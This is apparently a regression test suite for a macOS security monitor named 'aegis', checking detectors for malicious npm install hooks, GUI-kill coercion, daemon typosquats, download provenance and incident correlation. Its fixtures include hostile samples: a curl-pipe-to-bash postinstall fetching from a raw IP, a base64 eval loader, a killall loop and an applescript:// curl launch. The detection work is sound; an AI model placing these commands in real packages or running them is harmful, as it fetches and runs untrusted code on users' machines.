#!/usr/bin/env python3
"""Regression suite for the research-derived layers (deep-research + storm-research).

One test (or small cluster) per new capability, each written so it would FAIL
against the pre-build code (the detector / behavior did not exist). Reuses the
fully-sandboxed Sandbox base from test_regression, so this NEVER touches real
~/.aegis, reads the live host, or fires a notification. Stdlib-only.

Covers:
  B1 developer supply-chain sensor (npm lifecycle hooks + dropper dotfiles)
  B2 ClickLock GUI-kill coercion + Apple-daemon name typosquat
  B3 download provenance (QuarantineEventsV2) incl. the trusted-origin demotion
  B4 applescript:// URL-scheme execution (shell-history-evading delivery)
  B5 durable path lineage (drop now, execute later — beats the bounded window)
  C1 risk accumulation: cross-sensor corroboration escalates sooner, and the
     original single-sensor guarantee is NOT regressed
  C2 credential-capture + persistence/exfil short-circuit chain
  C3 Chrome downloads table as a second no-FDA origin source
  C4 wrapper-LOLBin unwrapping (caffeinate/nohup/sudo -u fronting a payload)
  D1 benign-positive vs false-positive dismissal reason codes
  D2 per-sensor precision down-weighting from dismissal history
  D3 known-benign-cause notes on the incident card
  D4 replay backtest is strictly read-only
"""
import json
import os
import sqlite3
import sys
import time
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))  # for sibling import
import aegis  # noqa: E402
from test_regression import Sandbox  # noqa: E402


# --------------------------------------------------------------------------- #
# B1 — developer-toolchain supply chain
# --------------------------------------------------------------------------- #
class TestSupplyChain(Sandbox):
    def _pkg(self, relpath, name, scripts):
        d = os.path.join(self.tmp, relpath)
        os.makedirs(d, exist_ok=True)
        with open(os.path.join(d, "package.json"), "w") as f:
            json.dump({"name": name, "scripts": scripts}, f)
        return d

    def test_malicious_postinstall_is_flagged(self):
        self._pkg("code/app/node_modules/evil", "evil",
                  {"postinstall": "curl -fsSL http://185.235.241.208/p | bash"})
        hits = [f for f in aegis.check_supply_chain()
                if f["category"] == "supply-chain" and "evil" in f["detail"]]
        self.assertTrue(hits, "a curl|bash postinstall must be flagged")
        self.assertEqual(hits[0]["severity"], "HIGH")

    def test_hexeval_js_loader_is_flagged(self):
        # DPRK's loader decodes an embedded blob in-process: no `base64 -d`, no
        # pipe — invisible to a purely shell-oriented pattern table.
        self._pkg("code/app/node_modules/@acme/bad", "@acme/bad",
                  {"preinstall": 'node -e "eval(Buffer.from(h,\'base64\'))"'})
        hits = [f for f in aegis.check_supply_chain() if "@acme/bad" in f["detail"]]
        self.assertTrue(hits, "in-process base64 eval loader must be flagged")
        self.assertIn("js-encoded-loader", hits[0]["markers"])

    def test_legitimate_prebuilt_installer_is_not_flagged(self):
        # The FP that would make this sensor unusable: legit packages download
        # prebuilt binaries in postinstall all the time.
        for i, script in enumerate((
                "node install.js", "prebuild-install || node-gyp rebuild",
                "curl -fsSL https://example.com/b.tgz -o b.tgz && tar xzf b.tgz",
                "patch-package", "husky install")):
            self._pkg("code/app/node_modules/ok%d" % i, "ok%d" % i,
                      {"postinstall": script})
        hits = [f for f in aegis.check_supply_chain() if f["category"] == "supply-chain"]
        self.assertEqual(hits, [], "ordinary installers must not alert")

    def test_dprk_dropper_dotfile_in_home(self):
        with open(os.path.join(self.tmp, ".npc"), "w") as f:
            f.write("x")
        hits = [f for f in aegis.check_supply_chain()
                if f.get("ioc") == "dprk-invisibleferret-dropper"]
        self.assertTrue(hits, "~/.npc is a documented dropper artifact")

    def test_sensor_is_wired_into_every_scan(self):
        ids = [sid for sid, _fn, _args in _sensors_of(aegis)]
        self.assertIn("supply-chain", ids)


def _sensors_of(mod):
    """The sensor table gather_all() iterates, without running any of them."""
    captured = {}

    def fake_collect(sensor_id, fn, health, *args):
        captured.setdefault("ids", []).append((sensor_id, fn, args))
        return []

    saved = mod._collect_sensor
    mod._collect_sensor = fake_collect
    try:
        mod.gather_all({}, {}, health=[])
    finally:
        mod._collect_sensor = saved
    return captured.get("ids", [])


# --------------------------------------------------------------------------- #
# B2 — ClickLock coercion + Apple-daemon typosquat
# --------------------------------------------------------------------------- #
class TestClickLockSignals(Sandbox):
    def test_gui_kill_loop_escalates_to_critical(self):
        argv = "sh -c while true; do killall Activity Monitor; sleep 0.2; done"
        sigs = dict(aegis._argv_signals(argv))
        self.assertEqual(sigs.get("gui-kill-loop-coercion"), "CRITICAL")

    def test_single_gui_kill_is_high_not_critical(self):
        sigs = dict(aegis._argv_signals("killall SystemUIServer"))
        self.assertEqual(sigs.get("gui-kill-coercion"), "HIGH")
        self.assertNotIn("gui-kill-loop-coercion", sigs)

    def test_ordinary_dock_restart_is_not_flagged(self):
        # `killall Dock` is a common troubleshooting command — must stay silent.
        self.assertEqual(aegis._argv_signals("/usr/bin/killall Dock"), [])

    def test_apple_daemon_typosquat_detected(self):
        self.assertEqual(aegis._typosquats_apple_daemon("SystemUIServerl"),
                         "systemuiserver")
        self.assertEqual(aegis._typosquats_apple_daemon("cfprefsdd"), "cfprefsd")

    def test_real_daemon_name_is_not_a_typosquat(self):
        self.assertIsNone(aegis._typosquats_apple_daemon("SystemUIServer"))
        self.assertIsNone(aegis._typosquats_apple_daemon("python3"))
        self.assertIsNone(aegis._typosquats_apple_daemon("node"))

    def test_short_names_that_collide_with_ordinary_commands_are_silent(self):
        # Found against a live 537-process table: at edit-distance 1 the SHORT
        # daemon names collide with ordinary binaries (/usr/bin/log ~ logd,
        # finger ~ finder, doc ~ dock). Any of those in a user-writable path
        # would have fired a false HIGH, so short names are not compared.
        for name in ("log", "logs", "finger", "doc", "dockk", "mds", "trusts"):
            self.assertIsNone(aegis._typosquats_apple_daemon(name),
                              "%r must not be treated as a typosquat" % name)

    def test_long_daemon_typosquats_still_caught_after_tightening(self):
        for name, real in (("SystemUIServerl", "systemuiserver"),
                           ("coreauthdd", "coreauthd"),
                           ("windowservere", "windowserver")):
            self.assertEqual(aegis._typosquats_apple_daemon(name), real)

    def test_edit_distance_helper(self):
        self.assertTrue(aegis._edit_distance_le1("abc", "abc"))
        self.assertTrue(aegis._edit_distance_le1("abc", "abcd"))   # insert
        self.assertTrue(aegis._edit_distance_le1("abcd", "abc"))   # delete
        self.assertTrue(aegis._edit_distance_le1("abc", "abx"))    # substitute
        self.assertFalse(aegis._edit_distance_le1("abc", "axy"))   # distance 2


# --------------------------------------------------------------------------- #
# B4 — applescript:// delivery (bypasses Terminal AND shell history)
# --------------------------------------------------------------------------- #
class TestAppleScriptURLScheme(Sandbox):
    def test_applescript_url_is_high(self):
        sigs = dict(aegis._argv_signals(
            "open applescript://com.apple.scripteditor?action=new&script=curl"))
        self.assertEqual(sigs.get("applescript-url-scheme"), "HIGH")

    def test_shared_content_table_sees_it_too(self):
        # so a launchd ProgramArguments / shell-rc carrying it is caught as well
        self.assertIn("applescript-url-scheme",
                      aegis._hostile_content("open applescript://x"))


# --------------------------------------------------------------------------- #
# B3 / C3 — download provenance without Full Disk Access
# --------------------------------------------------------------------------- #
class TestProvenance(Sandbox):
    def _quarantine_db(self, uuid, url):
        path = os.path.join(self.tmp, "Library", "Preferences",
                            "com.apple.LaunchServices.QuarantineEventsV2")
        os.makedirs(os.path.dirname(path), exist_ok=True)
        con = sqlite3.connect(path)
        con.execute("CREATE TABLE LSQuarantineEvent("
                    "LSQuarantineEventIdentifier TEXT, "
                    "LSQuarantineDataURLString TEXT, "
                    "LSQuarantineOriginURLString TEXT)")
        con.execute("INSERT INTO LSQuarantineEvent VALUES(?,?,?)", (uuid, url, url))
        con.commit()
        con.close()
        aegis._QUARANTINE_EVENTS_DB = path
        return path

    def test_origin_url_resolved_from_quarantine_events_db(self):
        self._quarantine_db("UUID-1", "https://evil.example/payload.dmg")
        self.assertEqual(aegis._origin_from_quarantine_db("UUID-1"),
                         "https://evil.example/payload.dmg")

    def test_unknown_uuid_returns_none(self):
        self._quarantine_db("UUID-1", "https://x.example/a")
        self.assertIsNone(aegis._origin_from_quarantine_db("NOPE"))

    def _chrome_profile(self, profile, target, url):
        """A History DB at the real on-disk shape: <root>/<profile>/History."""
        root = os.path.join(self.tmp, "Chrome")
        d = os.path.join(root, profile)
        os.makedirs(d, exist_ok=True)
        hist = os.path.join(d, "History")
        con = sqlite3.connect(hist)
        con.execute("CREATE TABLE downloads(target_path TEXT, tab_url TEXT, "
                    "start_time INTEGER)")
        con.execute("INSERT INTO downloads VALUES(?,?,?)", (target, url, 1))
        con.commit()
        con.close()
        aegis._CHROME_ROOTS = [root]
        return hist

    def test_chrome_downloads_table_is_a_second_origin_source(self):
        self._chrome_profile("Default", "/tmp/dropped.bin",
                             "https://lure.example/fake-update")
        self.assertEqual(aegis._origin_from_chrome_history("/tmp/dropped.bin"),
                         "https://lure.example/fake-update")

    def test_a_non_default_profile_is_reached_too(self):
        # The regression: hardcoding Default/History reached 1 of this Mac's
        # 15 profiles, so 1,479 download rows were invisible and provenance
        # returned None -- which reads as "no known origin" and keeps a
        # hot-dir finding loud.
        self._chrome_profile("Profile 7", "/tmp/dropped.bin",
                             "https://lure.example/from-profile-7")
        self.assertEqual(aegis._origin_from_chrome_history("/tmp/dropped.bin"),
                         "https://lure.example/from-profile-7")

    def test_trusted_origin_hosts_recognized(self):
        self.assertEqual(aegis._origin_host("https://objects.githubusercontent.com/x"),
                         "objects.githubusercontent.com")
        self.assertEqual(aegis._origin_host("https://u:p@GitHub.com:443/a"), "github.com")

    def test_sqlite_uri_escapes_special_chars(self):
        self.assertEqual(aegis._sqlite_uri_path("/a/b?c#d"), "/a/b%3fc%23d")

    def test_readonly_open_of_missing_db_is_none(self):
        self.assertIsNone(aegis._sqlite_readonly(os.path.join(self.tmp, "nope.db")))


# --------------------------------------------------------------------------- #
# C4 — wrapper LOLBins fronting the real payload
# --------------------------------------------------------------------------- #
class TestWrapperLaunchers(Sandbox):
    def test_caffeinate_wrapping_hidden_home_payload_is_hostile(self):
        args = ["/usr/bin/caffeinate", "-i", os.path.join(aegis.HOME, ".payload")]
        self.assertTrue(aegis._hostile_args(args, "/usr/bin/caffeinate"))

    def test_wrapper_value_flag_does_not_eat_the_payload(self):
        args = ["/usr/bin/caffeinate", "-i", "-t", "3600",
                os.path.join(aegis.HOME, ".agent")]
        self.assertTrue(aegis._hostile_args(args, "/usr/bin/caffeinate"))

    def test_sudo_u_wrapper_unwrapped(self):
        args = ["sudo", "-u", "someone", "/bin/bash", "/tmp/x.sh"]
        self.assertTrue(aegis._hostile_args(args, None))

    def test_caffeinate_wrapping_legit_app_is_not_hostile(self):
        args = ["/usr/bin/caffeinate", "-i",
                "/Applications/Legit.app/Contents/MacOS/Legit"]
        self.assertFalse(aegis._hostile_args(args, "/usr/bin/caffeinate"))

    def test_wrapper_with_no_payload_is_not_hostile(self):
        self.assertFalse(aegis._hostile_args(["/usr/bin/caffeinate", "-i"],
                                             "/usr/bin/caffeinate"))

    def test_script_target_sees_through_the_wrapper(self):
        args = ["/usr/bin/caffeinate", "-i", "/bin/bash",
                os.path.join(aegis.HOME, ".agent")]
        self.assertEqual(aegis._script_target(args, "/usr/bin/caffeinate"),
                         os.path.join(aegis.HOME, ".agent"))


# --------------------------------------------------------------------------- #
# B5 — durable path lineage (the entity-hop / slow-burn fix)
# --------------------------------------------------------------------------- #
class TestPathLineage(Sandbox):
    def test_drop_then_later_persistence_opens_critical_chain(self):
        path = "/Users/Shared/payload.bin"
        aegis.record_security_state([aegis.finding(
            "HIGH", "hot-dir", "Unsigned executable in watched folder", "d",
            "fp-drop", path=path)])
        # A SEPARATE later scan: launchd now points at the same path.
        aegis.record_security_state([aegis.finding(
            "MEDIUM", "persistence", "New persistence item", "d",
            "fp-persist", path=path)])
        chains = [i for i in aegis.list_incidents()
                  if i["correlation_key"].startswith("chain:lineage")]
        self.assertTrue(chains, "a remembered drop later persisted must chain")
        self.assertEqual(chains[0]["severity"], "CRITICAL")

    def test_lineage_survives_beyond_the_bounded_correlation_window(self):
        path = "/Users/Shared/slow.bin"
        aegis.record_security_state([aegis.finding(
            "HIGH", "hot-dir", "drop", "d", "fp-slow-drop", path=path)])
        # Backdate the drop far past the 900/1800s chain window.
        db = aegis._event_connection()
        with db:
            db.execute("UPDATE path_lineage SET first_seen=?, last_seen=?",
                       (int(time.time()) - 30 * 86400,) * 2)
            db.execute("UPDATE events SET observed_at=?",
                       (int(time.time()) - 30 * 86400,))
        db.close()
        aegis.record_security_state([aegis.finding(
            "MEDIUM", "process", "exec", "d", "fp-slow-exec", path=path)])
        chains = [i for i in aegis.list_incidents()
                  if i["correlation_key"].startswith("chain:lineage")]
        self.assertTrue(chains, "lineage must not expire with the time window")

    def test_unrelated_paths_do_not_chain(self):
        aegis.record_security_state([aegis.finding(
            "HIGH", "hot-dir", "drop", "d", "fp-a", path="/Users/Shared/a.bin")])
        aegis.record_security_state([aegis.finding(
            "MEDIUM", "persistence", "p", "d", "fp-b", path="/Users/Shared/b.bin")])
        chains = [i for i in aegis.list_incidents()
                  if i["correlation_key"].startswith("chain:lineage")]
        self.assertEqual(chains, [])

    def test_relative_entities_are_ignored(self):
        self.assertIsNone(aegis._lineage_path({"path": "not-absolute"}))
        # /tmp is a macOS firmlink to /private/tmp; the lineage key canonicalizes
        # to the real form so a drop and its later execution join across aliases.
        self.assertEqual(aegis._lineage_path({"path": "/tmp/./x"}),
                         "/private/tmp/x")

    def test_lineage_joins_across_tmp_private_tmp_firmlink(self):
        # A dropper writes the payload at /tmp/eve (the alias form a hot-dir or
        # staging sensor reports); a launchd job later runs it as the canonical
        # /private/tmp/eve. These are the SAME on-disk object — the CRITICAL
        # lineage chain must fire regardless of which alias each sensor used.
        # /tmp is the #1 macOS malware staging location, so this is the common
        # case. Pre-fix (normpath-only keys) this silently produced two
        # standalone HIGHs and no chain.
        for drop_form, act_form in (("/tmp/eve", "/private/tmp/eve"),
                                    ("/private/tmp/eve", "/tmp/eve")):
            with self.subTest(drop=drop_form, act=act_form):
                self._reset_event_db()
                aegis.record_security_state([aegis.finding(
                    "HIGH", "hot-dir", "drop", "d", "fp-x", path=drop_form)],
                    now=1000)
                aegis.record_security_state([aegis.finding(
                    "MEDIUM", "persistence", "p", "d", "fp-y", path=act_form)],
                    now=1000 + 3 * 86400)
                chains = [i for i in aegis.list_incidents()
                          if i["correlation_key"].startswith("chain:lineage")]
                self.assertTrue(chains, "%s -> %s must chain" % (drop_form, act_form))
                self.assertEqual(chains[0]["severity"], "CRITICAL")

    def test_lineage_firmlink_canon_is_discriminating(self):
        # Mutation guard: neutering the canonicalizer to identity must break the
        # cross-form join above — proving the test depends on the mechanism and
        # is not a tautology.
        saved = aegis._canon_entity_path
        aegis._canon_entity_path = lambda v: os.path.normpath(v) if v else v
        try:
            self._reset_event_db()
            aegis.record_security_state([aegis.finding(
                "HIGH", "hot-dir", "drop", "d", "fp-x", path="/tmp/eve")],
                now=1000)
            aegis.record_security_state([aegis.finding(
                "MEDIUM", "persistence", "p", "d", "fp-y", path="/private/tmp/eve")],
                now=1000 + 3 * 86400)
            chains = [i for i in aegis.list_incidents()
                      if i["correlation_key"].startswith("chain:lineage")]
            self.assertEqual(chains, [])  # no join without canonicalization
        finally:
            aegis._canon_entity_path = saved

    def _reset_event_db(self):
        try:
            os.remove(aegis.EVENT_DB)
        except OSError:
            pass
        aegis.init_event_store()


# --------------------------------------------------------------------------- #
# C1 / C2 — correlation quality
# --------------------------------------------------------------------------- #
class TestCorrelationQuality(Sandbox):
    def test_two_sensors_corroborating_escalate_sooner(self):
        entity = "/Users/Shared/thing"
        aegis.record_security_state([
            aegis.finding("MEDIUM", "net-outbound", "o1", "d", "fp-1",
                          path=entity, confidence="medium"),
            aegis.finding("MEDIUM", "btm", "o2", "d", "fp-2",
                          path=entity, confidence="medium"),
        ])
        risk = [i for i in aegis.list_incidents()
                if i["title"].startswith("Accumulated risk")]
        self.assertTrue(risk, "2 signals from 2 DIFFERENT sensors should escalate")
        self.assertIn("2 sensors", risk[0]["title"])

    def test_single_sensor_guarantee_is_not_regressed(self):
        # The pre-existing documented behavior: 3 distinct MEDIUMs from ONE
        # sensor on one entity still escalate.
        entity = "/Users/Shared/solo"
        aegis.record_security_state([
            aegis.finding("MEDIUM", "net-outbound", "o%d" % i, "d", "s-%d" % i,
                          path=entity, confidence="medium") for i in range(3)])
        risk = [i for i in aegis.list_incidents()
                if i["title"].startswith("Accumulated risk")]
        self.assertTrue(risk, "single-sensor pile-up must still escalate")

    def test_two_signals_from_one_sensor_still_do_not_escalate(self):
        entity = "/Users/Shared/pair"
        aegis.record_security_state([
            aegis.finding("MEDIUM", "net-outbound", "o%d" % i, "d", "p-%d" % i,
                          path=entity, confidence="medium") for i in range(2)])
        risk = [i for i in aegis.list_incidents()
                if i["title"].startswith("Accumulated risk")]
        self.assertEqual(risk, [])

    def test_chain_joins_across_tmp_private_tmp_firmlink(self):
        # persistence(/private/tmp/evil) + execution(/tmp/evil) are the same file
        # via the macOS firmlink; the persistence->execution CRITICAL chain must
        # fire. Pre-fix these were two standalone HIGHs, never one CRITICAL case.
        aegis.record_security_state([
            aegis.finding("HIGH", "persistence", "New persistence item", "d",
                          "cf-1", program="/private/tmp/evil", label="com.evil"),
            aegis.finding("HIGH", "process", "Suspicious running process", "d",
                          "cf-2", path="/tmp/evil"),
        ])
        chains = [i for i in aegis.list_incidents()
                  if i["correlation_key"].startswith("chain:persistence-execution")]
        self.assertTrue(chains, "persistence + execution on one file must chain")
        self.assertEqual(chains[0]["severity"], "CRITICAL")

    def test_same_entity_unifies_firmlink_forms(self):
        self.assertTrue(aegis._same_entity({"path": "/tmp/x"},
                                           {"path": "/private/tmp/x"}))
        self.assertTrue(aegis._same_entity({"program": "/var/f/y"},
                                           {"path": "/private/var/f/y"}))
        # ...but never over-collapses a lookalike prefix or distinct paths.
        self.assertFalse(aegis._same_entity({"path": "/tmpfoo/x"},
                                            {"path": "/private/tmpfoo/x"}))
        self.assertFalse(aegis._same_entity({"path": "/Users/a"},
                                            {"path": "/Users/b"}))

    def test_credential_capture_plus_persistence_chains(self):
        entity = "/Users/Shared/stealer"
        aegis.record_security_state([
            aegis.finding("HIGH", "behavior", "Suspicious process behavior", "d",
                          "cc-1", path=entity,
                          markers=["dscl-authonly-passcheck"]),
            aegis.finding("MEDIUM", "persistence", "New persistence item", "d",
                          "cc-2", path=entity),
        ])
        chains = [i for i in aegis.list_incidents()
                  if i["correlation_key"].startswith("chain:credential-capture")]
        self.assertTrue(chains, "credential capture + persistence must chain")
        self.assertEqual(chains[0]["severity"], "CRITICAL")


# --------------------------------------------------------------------------- #
# D1 / D2 / D3 — triage ergonomics for a one-person SOC
# --------------------------------------------------------------------------- #
class TestTriageWorkflow(Sandbox):
    def _one_incident(self, fingerprint="t-1", category="hot-dir"):
        aegis.record_security_state([aegis.finding(
            "HIGH", category, "t", "d", fingerprint, path="/Users/Shared/t.bin")])
        return aegis.list_incidents()[0]["id"]

    def test_benign_positive_and_false_positive_are_recorded_separately(self):
        inc = self._one_incident()
        self.assertTrue(aegis.transition_incident(
            inc, "FALSE_POSITIVE", reason_code="benign-positive"))
        self.assertEqual(aegis.incident_detail(inc)["resolution"], "benign-positive")
        db = aegis._event_connection()
        codes = [r["reason_code"] for r in
                 db.execute("SELECT reason_code FROM dismissals").fetchall()]
        db.close()
        self.assertEqual(set(codes), {"benign-positive"})

    def test_default_dismissal_is_recorded_as_false_positive(self):
        # No reason code → the pre-existing status-derived resolution is kept
        # (unchanged behavior), and the dismissal is booked as a false positive.
        inc = self._one_incident()
        aegis.transition_incident(inc, "FALSE_POSITIVE")
        self.assertEqual(aegis.incident_detail(inc)["resolution"], "false_positive")
        db = aegis._event_connection()
        codes = [r["reason_code"] for r in
                 db.execute("SELECT reason_code FROM dismissals").fetchall()]
        db.close()
        self.assertEqual(set(codes), {"false-positive"})

    def test_reopening_clears_the_dismissal_record(self):
        # A dismissal that was itself wrong must stop counting against precision.
        inc = self._one_incident()
        aegis.transition_incident(inc, "FALSE_POSITIVE", reason_code="benign-positive")
        aegis.transition_incident(inc, "OPEN")
        db = aegis._event_connection()
        n = db.execute("SELECT COUNT(*) FROM dismissals").fetchone()[0]
        db.close()
        self.assertEqual(n, 0)

    def test_incident_exposes_its_sensor_categories(self):
        inc = self._one_incident(category="persistence")
        self.assertIn("persistence", aegis.incident_detail(inc)["categories"])

    def test_known_benign_causes_surface_for_the_incident(self):
        inc = self._one_incident(category="persistence")
        notes = aegis._benign_note_for(aegis.incident_detail(inc))
        self.assertTrue(notes)
        self.assertTrue(any("persistence" in n for n in notes))

    def test_every_benign_note_is_keyed_on_a_reachable_category(self):
        """_benign_note_for does an EXACT dict lookup on the finding category,
        so a note keyed on a SURFACE id instead is dead code that renders for
        nobody. Three were: "browserext", "ide_ext" and "wallet" — the surface
        ids — while the categories those sensors actually emit are
        "browser-ext", "ide-ext" and "wallet-integrity". The two extension
        surfaces are the most false-positive-prone ones in the tool, so the
        notes that never rendered were exactly the notes triage needed most.

        Pinned per-category rather than by scraping finding() call sites: the
        categories are also emitted from multi-line calls with a variable
        severity, which no source regex reads reliably.
        """
        for category in ("browser-ext", "ide-ext", "wallet-integrity"):
            with self.subTest(category=category):
                inc = self._one_incident(category=category)
                notes = aegis._benign_note_for(aegis.incident_detail(inc))
                self.assertTrue(
                    any(category in n for n in notes),
                    "no benign-cause note rendered for %r" % category)

    def test_chronically_dismissed_sensor_is_down_weighted(self):
        now = int(time.time())
        db = aegis._event_connection()
        with db:
            for i in range(6):
                db.execute("INSERT INTO dismissals(incident_id,correlation_key,"
                           "reason_code,category,dismissed_at) VALUES(?,?,?,?,?)",
                           (i, "k%d" % i, "false-positive", "hot-dir", now))
        weights = aegis._category_dismissal_weights(db, now)
        db.close()
        self.assertIn("hot-dir", weights)
        self.assertLess(weights["hot-dir"], 1.0)
        self.assertGreaterEqual(weights["hot-dir"], aegis._PRECISION_FLOOR)

    def test_small_sample_does_not_mute_a_sensor(self):
        now = int(time.time())
        db = aegis._event_connection()
        with db:
            db.execute("INSERT INTO dismissals(incident_id,correlation_key,"
                       "reason_code,category,dismissed_at) VALUES(?,?,?,?,?)",
                       (1, "k", "false-positive", "behavior", now))
        weights = aegis._category_dismissal_weights(db, now)
        db.close()
        self.assertNotIn("behavior", weights, "one dismissal must not mute a sensor")


# --------------------------------------------------------------------------- #
# D4 — replay backtest is read-only
# --------------------------------------------------------------------------- #
class TestReplay(Sandbox):
    def test_replay_never_mutates_durable_state(self):
        aegis.record_security_state([aegis.finding(
            "HIGH", "hot-dir", "t", "d", "r-1", path="/Users/Shared/r.bin")])
        before = [dict(i) for i in aegis.list_incidents(active_only=False)]
        self.assertEqual(aegis.cmd_replay(30), 0)
        after = [dict(i) for i in aegis.list_incidents(active_only=False)]
        self.assertEqual(len(before), len(after))
        self.assertEqual([i["correlation_key"] for i in before],
                         [i["correlation_key"] for i in after])

    def test_replay_with_no_history_is_not_an_error(self):
        self.assertEqual(aegis.cmd_replay(30), 0)

    def test_replay_scratch_schema_matches_the_real_store(self):
        # The backtest must build its throwaway DB from the SAME schema, or a
        # replay could pass while the real store rejects the same write.
        scratch = sqlite3.connect(":memory:")
        scratch.executescript(aegis._EVENT_SCHEMA_SQL)
        tables = {r[0] for r in scratch.execute(
            "SELECT name FROM sqlite_master WHERE type='table'").fetchall()}
        scratch.close()
        self.assertTrue({"events", "incidents", "incident_events",
                         "path_lineage", "dismissals"} <= tables)


if __name__ == "__main__":
    unittest.main()
